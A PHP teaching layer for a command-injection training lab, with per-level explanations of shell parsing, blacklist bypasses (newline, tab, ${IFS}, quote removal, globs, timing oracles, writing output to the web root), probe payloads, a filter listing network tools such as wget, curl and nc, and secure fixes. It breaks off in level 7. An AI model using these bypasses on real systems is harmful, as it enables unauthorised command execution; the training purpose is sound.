<?php
/**
 * OS Command Injection Lab · teaching layer
 * ---------------------------------------------------------------------------
 * Added underneath the existing two-panel challenge. Nothing here changes
 * challenge behaviour, flag values or the anti-cheat setup.
 *
 * Per level it supplies:
 *   - the exact string handed to shell_exec(), injection highlighted
 *   - a trace of the learner's real input through the level's real filter
 *   - how /bin/sh parses THAT command, and which of its features this
 *     level's blacklist actually covers
 *   - probes: one question each, never a finished exploit
 *   - on success, why that payload survived that filter
 *   - the fix, vulnerable line beside correct line
 *
 * Facts asserted below were checked against the running container:
 *   /bin/sh is dash;  $IFS is space, tab, newline;  brace expansion is absent;
 *   nmap and systemctl are not installed;  file, tac, nl, od, strings, rev,
 *   base64, curl, wget, host, dig, netstat, ps, timeout are.
 */

require_once __DIR__ . '/lab_kit.php';

/* =========================================================================
 * Filter state - recomputed with the SAME expressions each level runs
 * ===================================================================== */

/**
 * @return array{blocked:bool, by:string, index:int}
 */
function osci_filter_state(int $level, string $in): array
{
    $none = ['blocked' => false, 'by' => '', 'index' => -1];
    if ($in === '') {
        return $none;
    }

    switch ($level) {
        case 2:
            return strpos($in, ';') !== false
                ? ['blocked' => true, 'by' => ';', 'index' => 0]
                : $none;

        case 3:
            return strpos($in, ' ') !== false
                ? ['blocked' => true, 'by' => ' ', 'index' => 0]
                : $none;

        case 4:
            $kw = ['cat', 'less', 'more', 'head', 'tail', 'flag', 'passwd', 'shadow'];
            foreach ($kw as $i => $k) {
                if (stripos($in, $k) !== false) {
                    return ['blocked' => true, 'by' => $k, 'index' => $i];
                }
            }
            return $none;

        case 7:
            $chars = [';', '&', '|', '`', '$', '(', ')', '<', '>', ' ', 'cat', 'ls', 'whoami', 'id'];
            foreach ($chars as $i => $ch) {
                if (strpos($in, $ch) !== false) {
                    return ['blocked' => true, 'by' => $ch, 'index' => $i];
                }
            }
            return $none;

        case 8:
            $patterns = [
                '/[\&\|`\$\(\)]/i',
                '/\b(cat|ls|whoami|id|passwd|shadow|flag)\b/i',
                '/\b(wget|curl|nc|netcat|bash|sh)\b/i',
                '/\s+/i',
                '/\.\.\//i',
            ];
            foreach ($patterns as $i => $p) {
                if (preg_match($p, $in)) {
                    return ['blocked' => true, 'by' => $p, 'index' => $i];
                }
            }
            return $none;
    }
    return $none;
}

/** Static prefix / suffix of the string each level hands to the shell. */
function osci_cmd_parts(int $level): array
{
    switch ($level) {
        case 1:  return ['ping -c 4 ', ''];
        case 2:  return ['systemctl status ', " 2>/dev/null || echo 'Service not found'"];
        case 3:  return ['file ', ''];
        case 4:  return ['ps aux | grep ', ''];
        case 5:  return ['ping -c 1 $(echo ', ' | cut -d@ -f2) > /dev/null 2>&1'];
        case 6:  return ['systemctl is-active ', " && echo 'Service OK' || echo 'Service Failed' 2>/dev/null"];
        case 7:  return ['tail -n 10 /var/log/', ".log | grep 'ERROR' 2>&1"];
        case 8:  return ['nmap -sS -p ', ' localhost 2>&1'];
        case 9:  return ['netstat -an | grep ', ' > /dev/null 2>&1'];
        case 10: return ['timeout 1s ps aux | grep ', ' 2>&1'];
    }
    return ['', ''];
}

/* =========================================================================
 * Per-level static content
 * ===================================================================== */

function osci_teach_content(int $level): array
{
    $c = [];

    $c[1] = [
        'param'       => 'ip',
        'model_title' => 'The sink is /bin/sh, not ping',
        'model' => <<<'HTML'
<p><code>shell_exec()</code> does not run <code>ping</code>. It hands one string to
<code>/bin/sh -c</code> and lets the shell decide which programs to start. On this image
<code>/bin/sh</code> is a symlink to <code>dash</code>. Nothing named <code>ping</code> exists until the
shell has finished parsing the whole string, so every structural character in that string is acted on
first.</p>
<p>The structure dash looks for, in the command this level builds:</p>
<table class="lk-kv">
    <tr><td>command separators</td><td><code>;</code> and a newline run the next command unconditionally.
        <code>&amp;&amp;</code> runs it only if the previous exit status was 0, <code>||</code> only if it
        was non-zero. <code>|</code> connects stdout to stdin. <code>&amp;</code> runs the left side in the
        background and continues.</td></tr>
    <tr><td>substitution</td><td><code>`cmd`</code> and <code>$(cmd)</code> run a command and paste its
        standard output back into the line before the outer command starts.</td></tr>
    <tr><td>redirection</td><td><code>&lt;</code> <code>&gt;</code> <code>&gt;&gt;</code>
        <code>2&gt;&amp;1</code> move file descriptors. They cannot start a program, but they decide where
        output goes and they create files.</td></tr>
    <tr><td>word splitting</td><td>after expansion the line is split on the bytes in <code>$IFS</code>,
        which is space, tab and newline here. Then pathname expansion turns <code>*</code>, <code>?</code>
        and <code>[...]</code> into matching filenames.</td></tr>
</table>
<p>This level applies no blacklist, so every row above is available. Establish that deliberately, because
the next nine levels each remove one row or part of one, and the useful question is always which rows are
left rather than which payload is famous.</p>
<p>One property of the sink to know before you start: <code>shell_exec()</code> returns standard output
only. Standard error goes to the Apache error log, so a command can run, fail, and leave the page looking
exactly as if nothing happened. Append <code>2&gt;&amp;1</code> when you want to see why something did not
work.</p>
HTML,
        'why' => <<<'HTML'
<p>Your value reached <code>/bin/sh</code> byte for byte. Nothing stands between <code>$_GET['ip']</code>
and the concatenation, so the separator you sent ended <code>ping -c 4 &lt;value&gt;</code> and the shell
read what followed as a command of its own, executed as the web server user.</p>
<p>This is the baseline the rest of the lab is measured against. Levels 2, 3, 4, 7 and 8 keep this same
sink and put a blacklist in front of it. Levels 5, 6 and 9 keep the sink and take the output away. Nothing
that follows is a harder vulnerability, only a narrower channel.</p>
HTML,
        'fix_bad' => <<<'CODE'
$ip      = $_GET['ip'];
$command = "ping -c 4 " . $ip;
$output  = shell_exec($command);
CODE,
        'fix_good' => <<<'CODE'
// 1. Best: do not start a shell. PHP can answer this question
//    itself, and a value that never reaches a shell cannot be
//    parsed as shell syntax.
$ip = filter_var($_GET['ip'] ?? '', FILTER_VALIDATE_IP);
if ($ip === false) {
    http_response_code(400);
    exit('Not an IP address');
}

// 2. If an external binary really is required, pass an argument
//    array. proc_open() hands argv straight to execvp(), so no
//    byte in $ip is ever grammar.
$p = proc_open(
    ['ping', '-c', '4', '--', $ip],
    [1 => ['pipe', 'w'], 2 => ['pipe', 'w']],
    $pipes
);
$out = stream_get_contents($pipes[1]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($p);

// 3. Last resort, when the string form cannot be avoided:
//    escapeshellarg() on every interpolated value, plus the
//    validation above. Both, not either.
$command = 'ping -c 4 -- ' . escapeshellarg($ip);
CODE,
        'fix_note' => 'The <code>--</code> matters as much as the quoting. <code>escapeshellarg()</code>
            makes the value one word; it does not stop that word being read as an option by the program you
            called. A validated value plus an explicit end-of-options marker covers both.',
        'probes' => [
            ['q' => 'Does a command separator reach the shell at all?',
             'payload' => '8.8.8.8; echo separator-ran',
             'learn' => 'If <code>separator-ran</code> appears after the ping output, the semicolon was read as structure rather than as part of the address. That single observation is the whole finding for this level.'],
            ['q' => 'Is command substitution available as well as chaining?',
             'payload' => '$(echo 127.0.0.1)',
             'learn' => 'If the output shows a ping of 127.0.0.1, the <code>$( )</code> ran first and its result became the argument. Chaining and substitution are separate capabilities, and later levels block them separately.'],
            ['q' => 'Is standard error visible on this page?',
             'payload' => '--not-a-real-option',
             'learn' => '<code>ping</code> rejects the option and writes to stderr. The page stays empty because <code>shell_exec()</code> returns stdout only. Knowing this stops you concluding that a command was blocked when it merely failed.'],
        ],
    ];

    $c[2] = [
        'param'       => 'service',
        'model_title' => 'One separator blocked, six left',
        'model' => <<<'HTML'
<p>The filter is a single call: <code>strpos($service, ';') !== false</code>. Read it as a claim about the
shell grammar, then check the claim against what dash accepts:</p>
<table class="lk-kv">
    <tr><td><code>;</code></td><td>checked. This is the entire filter.</td></tr>
    <tr><td>newline</td><td>not checked. In every POSIX shell a newline terminates a command exactly as
        <code>;</code> does. It survives a query string as <code>%0a</code>.</td></tr>
    <tr><td><code>&amp;&amp;</code> and <code>||</code></td><td>not checked. Conditional execution on the
        previous exit status.</td></tr>
    <tr><td><code>|</code></td><td>not checked. The right-hand side runs whatever the left side returned,
        which makes it the most reliable of the three here.</td></tr>
    <tr><td><code>&amp;</code></td><td>not checked. Runs the left side in the background and continues.</td></tr>
    <tr><td><code>`cmd`</code> and <code>$(cmd)</code></td><td>not checked. Both run a command.</td></tr>
    <tr><td><code>&lt;</code> <code>&gt;</code> <code>&gt;&gt;</code></td><td>not checked.</td></tr>
</table>
<p>Two details of this particular command are worth reading off the sink line below. The template ends with
<code>2&gt;/dev/null || echo 'Service not found'</code> and your value is inserted before that tail, so
whatever you chain becomes part of the same line: the <code>2&gt;/dev/null</code> that was written for
<code>systemctl</code> ends up attached to your command instead, and <code>|</code> binds more tightly
than <code>||</code>.</p>
<p>Second, <code>systemctl</code> is not installed in this image. The left-hand side therefore always exits
127 with "not found" on stderr. That makes <code>||</code> fire every time and <code>&amp;&amp;</code>
never fire. It is a property of the environment rather than of the filter, and it is the kind of thing
worth confirming with one probe before blaming a payload.</p>
HTML,
        'why' => <<<'HTML'
<p>Your value contained no <code>;</code> byte, so <code>strpos()</code> returned <code>false</code> and
the string was concatenated and executed unchanged. The separator you used instead is one the check never
looked for.</p>
<p>The check was accurate about what it checked. It was a statement about one character in a grammar with
at least six other ways to end a command, and the author of the filter had to think of all of them while
you only had to think of one.</p>
HTML,
        'fix_bad' => <<<'CODE'
if (strpos($service, ';') !== false) {
    echo 'Security Alert: Semicolon blocked!';
} else {
    $command = "systemctl status " . $service
             . " 2>/dev/null || echo 'not found'";
    $output  = shell_exec($command);
}
CODE,
        'fix_good' => <<<'CODE'
// Allowlist the shape of the value, then keep it out of shell
// syntax entirely. A unit name is a narrow, describable thing.
$service = (string)($_GET['service'] ?? '');
if (!preg_match('/^[A-Za-z0-9._@-]{1,64}$/', $service)) {
    http_response_code(400);
    exit('Invalid service name');
}

// No shell: argv goes straight to execvp(), so a ";" in the value
// is a semicolon inside an argument and nothing else.
$p = proc_open(
    ['systemctl', 'status', '--', $service],
    [1 => ['pipe', 'w'], 2 => ['pipe', 'w']],
    $pipes
);
$out = stream_get_contents($pipes[1]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($p);

// If the string form is unavoidable:
//   $command = 'systemctl status -- '
//            . escapeshellarg($service);
CODE,
        'fix_note' => 'Counting characters is the wrong exercise. Adding <code>&amp;</code>,
            <code>|</code> and a newline to this blacklist would still leave <code>$( )</code>, backticks
            and redirection, and the list would still have to be right about a grammar that PHP does not
            own. <code>escapeshellarg()</code> removes the question for one value; an argument array
            removes it for all of them.',
        'probes' => [
            ['q' => 'Which character does the filter actually check?',
             'payload' => 'apache2;echo blocked-probe',
             'learn' => 'This is rejected. Read the trace: it names the matched entry, and there is only one entry to name.'],
            ['q' => 'Does the pipe reach the shell?',
             'payload' => 'apache2 | wc -c',
             'learn' => 'A byte count on the page means <code>|</code> was parsed as structure and your command received the left side&rsquo;s stdout. A count of 0 also tells you the left side produced nothing.'],
            ['q' => 'Which branch of the template&rsquo;s own || fires?',
             'payload' => 'nosuchservice || echo fallback-ran',
             'learn' => 'The template already ends with <code>|| echo \'Service not found\'</code>. Seeing <code>fallback-ran</code> instead means the left side failed and your branch consumed the failure &mdash; which tells you whether <code>&amp;&amp;</code> is usable here before you rely on it.'],
        ],
    ];

    $c[3] = [
        'param'       => 'filename',
        'model_title' => 'Word splitting, and the bytes that do it',
        'model' => <<<'HTML'
<p>The filter is <code>strpos($filename, ' ') !== false</code>: one byte, 0x20. The capability it is trying
to remove is word splitting, and word splitting in dash is done by every byte in <code>$IFS</code>, which
here is space, <em>tab</em> and <em>newline</em>. Two of the three are unchecked.</p>
<table class="lk-kv">
    <tr><td>tab (<code>%09</code>)</td><td>in <code>$IFS</code>. Separates words. Not checked.</td></tr>
    <tr><td>newline (<code>%0a</code>)</td><td>in <code>$IFS</code>, and also a command separator. Not
        checked.</td></tr>
    <tr><td><code>${IFS}</code></td><td>expansion happens after the filter has finished. The shell replaces
        the variable and then splits the result on <code>$IFS</code>, producing a word break from a request
        that contains no whitespace byte at all. <code>$</code> is not checked here.</td></tr>
    <tr><td><code>&lt;</code></td><td>redirection needs no space:
        <code>tail&lt;/etc/hostname</code> is one word plus a redirect. Not checked.</td></tr>
    <tr><td><code>{cmd,arg}</code></td><td>brace expansion is a <strong>bash</strong> feature.
        <code>/bin/sh</code> on this image is <code>dash</code>, which does not implement it: the word is
        passed through literally and you get "not found". Hint 4 recommends this construction; it does not
        work here.</td></tr>
</table>
<p>At the URL layer, both <code>%20</code> and a literal <code>+</code> in a query string decode to 0x20
before PHP sees them, so both are caught by the same check. The trace below prints the decoded bytes, which
is what <code>strpos()</code> is looking at.</p>
<p>Note also what this level is not about. Removing the space removes nothing structural: <code>;</code>
<code>&amp;</code> <code>|</code> newline, both substitution forms and all redirection are untouched. The
space is only in the way of writing a second argument.</p>
HTML,
        'why' => <<<'HTML'
<p>No 0x20 byte appeared in the parameter, so <code>strpos()</code> returned <code>false</code>. The word
break the shell needed came from a different byte in <code>$IFS</code>, or from an expansion that produced
one after the check had already finished.</p>
<p>That ordering is the general lesson. A string filter inspects request bytes; the shell inspects the same
bytes several transformation steps later. Anything the shell creates in between is invisible to the filter
by construction.</p>
HTML,
        'fix_bad' => <<<'CODE'
if (strpos($filename, ' ') !== false) {
    echo 'Security Alert: Spaces are not allowed!';
} else {
    $command = "file " . $filename;
    $output  = shell_exec($command);
}
CODE,
        'fix_good' => <<<'CODE'
// The value is a path. Resolve it, confine it to a base
// directory, then run the tool with no shell at all.
$base = '/var/www/uploads';
$name = basename((string)($_GET['filename'] ?? ''));
$real = realpath($base . '/' . $name);

if ($real === false
    || strncmp($real, $base . '/', strlen($base) + 1) !== 0) {
    http_response_code(400);
    exit('Invalid path');
}

$p = proc_open(
    ['file', '--', $real],
    [1 => ['pipe', 'w'], 2 => ['pipe', 'w']],
    $pipes
);
$out = stream_get_contents($pipes[1]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($p);

// PHP answers this one without any subprocess:
//   $type = (new finfo(FILEINFO_MIME_TYPE))->file($real);
CODE,
        'fix_note' => 'Blocking a byte does not remove the capability the byte provided. Word splitting is
            performed by three bytes and by parameter expansion; command separation is performed by five
            more. <code>escapeshellarg()</code> makes all of them inert at once, because the value stops
            being syntax rather than stopping being suspicious.',
        'probes' => [
            ['q' => 'Does the check see the decoded byte or the raw request?',
             'payload' => '/etc/hostname extra',
             'learn' => 'Rejected. The trace prints the value after PHP has URL-decoded it, so <code>%20</code> and <code>+</code> both arrive here as 0x20 and both match.'],
            ['q' => 'Does a tab split words where a space would be rejected?',
             'payload' => "-b\t/etc/hostname",
             'learn' => 'If <code>file</code> reports on /etc/hostname instead of complaining about one long filename, the tab did the splitting. The parameter contains no space.'],
            ['q' => 'Does ${IFS} produce a word break after the filter has run?',
             'payload' => '-b${IFS}/etc/hostname',
             'learn' => 'The same result as the tab probe, produced by an expansion rather than by a byte. Compare the two traces: the raw value differs, the effect on the shell does not.'],
        ],
    ];

    $c[4] = [
        'param'       => 'process',
        'model_title' => 'The filter reads bytes; the shell decides names last',
        'model' => <<<'HTML'
<p>The list in the code is <code>['cat', 'less', 'more', 'head', 'tail', 'flag', 'passwd', 'shadow']</code>
and the test is <code>stripos()</code>: case-insensitive, unanchored, applied to the whole parameter. Two
consequences follow, and only one of them is about attackers.</p>
<p>The first is collateral. Any value containing those letters anywhere is rejected, so
<code>ps aux | grep cathy</code> is not a query this tool can answer.</p>
<p>The second is the bypass, and it is a question of ordering. The check runs on the request bytes. dash
decides what program to start much later, after three separate steps that can each manufacture a name the
filter never saw:</p>
<table class="lk-kv">
    <tr><td>quote removal</td><td><code>c''at</code>, <code>c""at</code> and <code>\cat</code> are three
        words that all become <code>cat</code> when the shell strips quoting. Verified on this image.</td></tr>
    <tr><td>parameter expansion</td><td><code>a=c;b=at;$a$b /etc/hostname</code> assembles the name from two
        assignments. Neither assignment contains a listed keyword.</td></tr>
    <tr><td>pathname expansion</td><td><code>/bin/ca?</code> matches <code>/bin/cat</code> on disk. Note
        that <code>/bin/c?t</code> matches both <code>/bin/cat</code> and <code>/bin/cut</code> here, and a
        glob expands to <em>all</em> matches in sorted order, so that one runs <code>cat</code> with
        <code>/bin/cut</code> as its first argument.</td></tr>
</table>
<p><code>flag</code> is on the list too, so the path <code>/tmp/level4_flag.txt</code> cannot be typed
literally either. The same glob mechanism covers that half: <code>/tmp/level4_f?ag.txt</code> names the
file without containing the string. Hint 5 recommends payloads that spell <code>flag</code> in full; those
are rejected by this filter, and the trace will name the entry that caught them.</p>
<p>What the list leaves entirely alone: every other reader on this image (<code>tac</code>, <code>nl</code>,
<code>od</code>, <code>strings</code>, <code>rev</code>, <code>base64</code>, <code>cut</code>,
<code>sed</code>, <code>awk</code>, <code>grep</code>), and every separator, substitution and redirection
character. Your value starts life as <code>grep</code>'s pattern argument, so a separator ends the grep and
begins whatever you want.</p>
HTML,
        'why' => <<<'HTML'
<p>None of the eight substrings appeared in the parameter, so the loop finished without a match. The
program name the shell ran was assembled after the check, out of quote removal, a variable expansion or a
glob.</p>
<p>The filter and the shell were reading two different strings. A keyword list is a claim about spelling,
and in a shell the spelling is decided last.</p>
HTML,
        'fix_bad' => <<<'CODE'
$blocked = ['cat', 'less', 'more', 'head', 'tail',
            'flag', 'passwd', 'shadow'];

foreach ($blocked as $kw) {
    if (stripos($process, $kw) !== false) {
        echo 'Blocked: ' . $kw;
        exit;
    }
}

$command = "ps aux | grep " . $process;
$output  = shell_exec($command);
CODE,
        'fix_good' => <<<'CODE'
// Do not shell out for this. The process table is a filesystem.
$needle = (string)($_GET['process'] ?? '');
if (!preg_match('/^[\w.-]{1,64}$/', $needle)) {
    http_response_code(400);
    exit('Invalid process name');
}

$rows = [];
foreach (glob('/proc/[0-9]*/cmdline') as $f) {
    $cmd = str_replace("\0", ' ', (string)@file_get_contents($f));
    if ($cmd !== '' && stripos($cmd, $needle) !== false) {
        $rows[] = trim($cmd);
    }
}

// If ps is required, run it with no shell and match in PHP:
//   $p    = proc_open(['ps', 'aux'], $desc, $pipes);
//   $rows = preg_grep('/' . preg_quote($needle, '/') . '/',
//                     explode("\n", stream_get_contents($pipes[1])));
CODE,
        'fix_note' => 'Nothing on the keyword list has to appear in the request for <code>cat</code> to
            run. That is not a gap in the list, it is a property of shell parsing, and it is why the
            control has to be "the value is not syntax" rather than "the value is not suspicious".',
        'probes' => [
            ['q' => 'Is the match anchored, or does it fire anywhere in the value?',
             'payload' => 'apache-catalog',
             'learn' => 'A legitimate process name containing "cat" is rejected. That tells you the check is an unanchored substring test, and it is also the cost this filter imposes on ordinary users.'],
            ['q' => 'Does the shell decide the program name after the filter has run?',
             'payload' => "zz;e''cho quote-removal-ran",
             'learn' => 'The parameter contains <code>e\'\'cho</code>, which is not a program. The shell strips the empty quotes while parsing and runs <code>echo</code>. The same step turns <code>c\'\'at</code> into <code>cat</code>.'],
            ['q' => 'Does a glob name a file without spelling it?',
             'payload' => 'zz;echo${IFS}/tmp/level4_f?ag.txt',
             'learn' => 'This echoes the expanded <em>path</em>, not the contents. If the full filename comes back, pathname expansion matched a real file, and the same glob works as an argument to a reader.'],
        ],
    ];

    $c[5] = [
        'param'       => 'email',
        'model_title' => 'Blind: the status line is not an oracle, the clock is',
        'model' => <<<'HTML'
<p>Your value lands <em>inside</em> a command substitution:
<code>ping -c 1 $(echo &lt;you&gt; | cut -d@ -f2) &gt; /dev/null 2&gt;&amp;1</code>. A separator there ends
the <code>echo</code> and starts a new command within the substitution, which still runs. No filter is
applied to the value at any point.</p>
<p>Now the part that decides how you work on this level. The code reports success from
<code>shell_exec("echo $?")</code>. That starts a <em>second</em>, independent <code>/bin/sh</code>, and
<code>$?</code> in a fresh shell is 0 before any command has run in it. Checked against this container:
the page reports "Email domain is reachable" for every input, including a domain that cannot resolve. The
status line carries no information at all.</p>
<p>What is left:</p>
<table class="lk-kv">
    <tr><td>wall-clock time</td><td>the HTTP response waits for <code>shell_exec()</code>. Measured here:
        about 0.11 s with no injection, about 3.04 s with <code>; sleep 3</code>. That is one bit per
        request &mdash; "the condition I attached the sleep to was true".</td></tr>
    <tr><td>side effects</td><td><code>/var/www/html</code> is a bind mount of this lab directory and is
        writable by the web server user, so anything written there is fetchable over HTTP on the next
        request.</td></tr>
    <tr><td>outbound network</td><td><code>curl</code>, <code>wget</code>, <code>host</code>,
        <code>dig</code> and <code>ping</code> are installed in this image.</td></tr>
</table>
<p>Cost, so you pick the right channel. A timing oracle yields one bit per request: extracting a
33-character flag one character at a time costs about 6 to 7 requests per character with a binary search
over the byte value, so roughly 200 requests, each at least as long as the delay you chose. Writing the
file somewhere you can fetch it costs two requests total. Use timing to <em>confirm</em> execution; use a
side channel to move data.</p>
HTML,
        'why' => <<<'HTML'
<p>The value was placed inside <code>$( )</code> with no filter, so a separator inside it started a second
command within the substitution and the shell ran it.</p>
<p>The reachable / not-reachable line played no part. It reports the exit status of a different shell and
is always 0. What told you the payload ran was the response time, or the artefact it left behind &mdash;
which is the definition of a blind injection: the capability is unchanged, only the channel is
narrower.</p>
HTML,
        'fix_bad' => <<<'CODE'
$command = "ping -c 1 $(echo " . $email
         . " | cut -d@ -f2) > /dev/null 2>&1";

shell_exec($command);
$exit_code = shell_exec("echo $?");   // always "0"
CODE,
        'fix_good' => <<<'CODE'
// Parse the address in PHP. There is no reason to hand an email
// address to a shell to find the part after the "@".
$email = (string)($_GET['email'] ?? '');
if (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
    http_response_code(400);
    exit('Invalid address');
}
$domain = substr($email, strrpos($email, '@') + 1);

// Reachability without a subprocess at all:
$hasMx = checkdnsrr($domain, 'MX');

// If an external binary is unavoidable, use an argument array,
// and read the real status from proc_close() - not from a second
// shell, where "echo $?" always prints 0.
$p = proc_open(
    ['ping', '-c', '1', '--', $domain],
    [1 => ['pipe', 'w'], 2 => ['pipe', 'w']],
    $pipes
);
fclose($pipes[1]);
fclose($pipes[2]);
$code = proc_close($p);
CODE,
        'fix_note' => 'Two independent defects here. The injection is fixed by not building a shell string.
            The status readout is fixed by taking the exit code from the process you started:
            <code>shell_exec("echo $?")</code> starts a new shell whose <code>$?</code> is 0, so this page
            reports success unconditionally.',
        'probes' => [
            ['q' => 'Does the reachable / not-reachable line depend on anything?',
             'payload' => 'user@this-domain-does-not-exist.invalid',
             'learn' => 'ping cannot resolve it, and the page still reports reachable. Confirm this once: it removes the only apparent oracle and forces you to find a real one.'],
            ['q' => 'Is the response time a usable oracle?',
             'payload' => 'user@x.test; sleep 2',
             'learn' => 'Time the request. A baseline near 0.1 s against about 2.1 s is the measurement every later step is built on. Nothing is read and nothing is written.'],
            ['q' => 'Does a command inside the substitution really run?',
             'payload' => 'user@x.test; touch /tmp/osci5-probe',
             'learn' => 'The page shows nothing either way. Re-run with <code>; ls -l /tmp/osci5-probe &gt; /var/www/html/osci5-probe.txt</code> and fetch <code>/osci5-probe.txt</code> to see the result. That is the write-then-read channel, demonstrated on a file that is not the flag.'],
        ],
    ];

    $c[6] = [
        'param'       => 'service',
        'model_title' => 'A timing oracle the application hands you',
        'model' => <<<'HTML'
<p>No filter runs on this parameter. The command is
<code>systemctl is-active &lt;you&gt; &amp;&amp; echo 'Service OK' || echo 'Service Failed'
2&gt;/dev/null</code>, and every separator, substitution and redirection from level 1 is available.</p>
<p><code>systemctl</code> is not installed in this image, so the left-hand side exits 127 and it is the
<code>||</code> branch that fires. If you chain with <code>&amp;&amp;</code>, your command has to be
reachable from a failing left side.</p>
<p><strong>How a hit is distinguished from a miss.</strong> The page prints
<code>round(microtime(true) - $start, 2)</code>, measured around <code>shell_exec()</code> only, so network
latency is excluded and the number is a clean measurement of how long the shell took. Measured on this
container: <code>apache2</code> reports <code>0</code>; <code>apache2;sleep 3</code> reports
<code>3</code>. A miss is 0 or 0.01, a hit is the length of your sleep.</p>
<p>That turns into a question by attaching the sleep to a test:
<code>x; [ -f /tmp/level6_flag.txt ] &amp;&amp; sleep 3</code> reports 3 if the file exists and 0 if it
does not. One request, one bit.</p>
<p><strong>What extraction costs.</strong> One bit per request. A linear scan over a 64-symbol alphabet
costs up to 64 requests per character; a binary search on the byte value costs 6 or 7. A 33-character flag
is therefore roughly 230 requests at 3 seconds each, about 12 minutes of wall time. The same information
leaves in one request if you redirect the file somewhere you can read it. Timing proves execution; it is a
poor transport.</p>
<p>Worth noticing: <code>shell_exec()</code> does return the command's standard output here, and this page
throws that return value away without printing it. The output exists. A redirect into
<code>/var/www/html</code> gives it back to you.</p>
HTML,
        'why' => <<<'HTML'
<p>No filter was applied, so the separator you sent split the command. The number the page prints is the
wall-clock duration of that shell, so a <code>sleep</code> in your payload appeared directly in it, and a
command that produced output produced it into a return value the page discards.</p>
<p>The general point: an application that hides output has not reduced what the attacker can do, only what
they can see. Every capability from level 1 is still present on this page.</p>
HTML,
        'fix_bad' => <<<'CODE'
$command = "systemctl is-active " . $service
         . " && echo 'Service OK' || echo 'Service Failed'";
$result  = shell_exec($command . " 2>/dev/null");

$execution_time = round(microtime(true) - $start_time, 2);
echo "Execution time: {$execution_time}s";
CODE,
        'fix_good' => <<<'CODE'
// Allowlist first: a systemd unit name is a narrow shape.
$service = (string)($_GET['service'] ?? '');
if (!preg_match('/^[A-Za-z0-9._@-]{1,64}$/', $service)) {
    http_response_code(400);
    exit('Invalid service name');
}

// No shell. proc_close() returns the real exit status.
$p = proc_open(
    ['systemctl', 'is-active', '--', $service],
    [1 => ['pipe', 'w'], 2 => ['pipe', 'w']],
    $pipes
);
$out = trim(stream_get_contents($pipes[1]));
fclose($pipes[1]);
fclose($pipes[2]);
$active = proc_close($p) === 0;

echo $active ? 'active' : 'inactive';
CODE,
        'fix_note' => 'Removing the timing readout would hide this oracle without fixing anything: the HTTP
            response time still varies with whatever the injected command does, so the measurement simply
            moves to the client. Timing is a symptom. The argument array is the fix, because it stops the
            value being parsed as a command.',
        'probes' => [
            ['q' => 'What does the timer read when nothing is injected?',
             'payload' => 'apache2',
             'learn' => 'Around 0 seconds. Without this baseline no later measurement means anything.'],
            ['q' => 'Does the timer follow the injected command?',
             'payload' => 'apache2;sleep 2',
             'learn' => 'The reported time should be about 2. The oracle is established with a payload that reads nothing and writes nothing.'],
            ['q' => 'Can the oracle answer a question rather than just confirm execution?',
             'payload' => 'apache2; [ -d /var/www/html ] && sleep 2',
             'learn' => 'The sleep is now conditional. About 2 seconds means the test was true, about 0 means false. Same request shape, one bit of information about the filesystem.'],
        ],
    ];

    $c[7] = [
        'param'       => 'logfile',
        'model_title' => 'Fourteen entries, and what is left after them',
        'model' => <<<'HTML'
<p>The list in the code, exactly: <code>;</code> <code>&amp;</code> <code>|</code> <code>`</code>
<code>$</code> <code>(</code> <code>)</code> <code>&lt;</code> <code>&gt;</code> the space, and the four
strings <code>cat</code> <code>ls</code> <code>whoami</code> <code>id</code>. The test is
<code>strpos()</code>: case-sensitive, unanchored, applied to the whole parameter.</p>
<p><strong>What that closes.</strong> <code>;</code> <code>&amp;</code> <code>&amp;&amp;</code>
<code>|</code> <code>||</code> are gone. Both forms of command substitution are gone, because
<code>`</code>, <code>$</code>, <code>(</code> and <code>)</code> are all listed. Every redirection is gone
with <code>&lt;</code> and <code>&gt;</code>. <code>${IFS}</code> is gone with <code>$</code>.</p>
<p><strong>What it leaves.</strong></p>
<table class="lk-kv">
    <tr><td>newline (<code>%0a</code>)</td><td>dash terminates a command on a newline exactly as on
        <code>;</code>. This is the only surviving separator, and it is the whole level.</td></tr>
    <tr><td>tab (<code>%09</code>)</td><td>in <code>$IFS</code>, so it separates words where the space
        would be rejected.</td></tr>
    <tr><td><code>#</code></td><td>starts a comment when it is the first character of a word, which
        discards the rest of the line.</td></tr>
    <tr><td>globs and quotes</td><td><code>*</code> <code>?</code> <code>[</code> <code>]</code>
        <code>'</code> <code>"</code> <code>\</code> are all unlisted.</td></tr>
    <tr><td><code>../</code></td><td>unlisted, and named in the annotation. On its own it is not enough
        &mdash; see below.</td></tr>
</table>
<p><strong>The suffix problem.</strong> The command is
<code>tail -n 10 /var/log/&lt;you&gt;.log | grep 'ERROR' 2&gt;&amp;1</code>. Your value is followed by
text you did not choose. Path traversal alone still gets <code>.log</code> appended, so
<code>../../tmp/level7_flag</code> resolves to a file that does not exist. A newline moves you onto a
second command line where that suffix is no longer attached to your command; a tab followed by
<code>#</code> turns the suffix into a comment instead of arguments. Without the tab, the <code>#</code>
is inside your last word and is an ordinary character, and the payload fails &mdash; hint 5 omits it.</p>
<p><strong>The four string entries.</strong> They are substring matches, case-sensitive.
<code>CAT</code> passes the check but is not a program on this image. Readers that pass the check and do
exist here: <code>tac</code>, <code>nl</code>, <code>od</code>, <code>strings</code>, <code>rev</code>,
<code>base64</code>, <code>head</code>, <code>tail</code>, <code>cut</code>, <code>tr</code>,
<code>sed</code>, <code>awk</code>, <code>grep</code>. The entries <code>ls</code> and <code>id</code> also
reject ordinary log names that happen to contain those two letters, which is the second thing this filter
buys.</p>
HTML,
        'why' => <<<'HTML'
<p>The parameter contained none of the fourteen entries. The separator that split the command was the
newline, which the list does not mention, and the word break was a tab rather than a space. If you used
<code>#</code>, the fixed <code>.log | grep 'ERROR' 2&gt;&amp;1</code> tail became a comment instead of
arguments to your command.</p>
<p>This list is far longer than the ones in levels 2 to 4 and it still misses a character that terminates a
command in every POSIX shell. Enumerating dangerous bytes means enumerating a grammar you did not write and
cannot freeze.</p>
HTML,
        'fix_bad' => <<<'CODE'
$blocked_chars = [';', '&', '|', '`', '$', '(', ')',
                  '<', '>', ' ',
                  'cat', 'ls', 'whoami', 'id'];

foreach ($blocked_chars as $char) {
    if (strpos($logfile, $char) !== false) {
        echo 'Blocked: ' . $char;
        exit;
    }
}

$command = "tail -n 10 /var/log/" . $logfile
         . ".log | grep 'ERROR'";
$output  = shell_exec($command . " 2>&1");
CODE,
        'fix_good' => <<<'CODE'
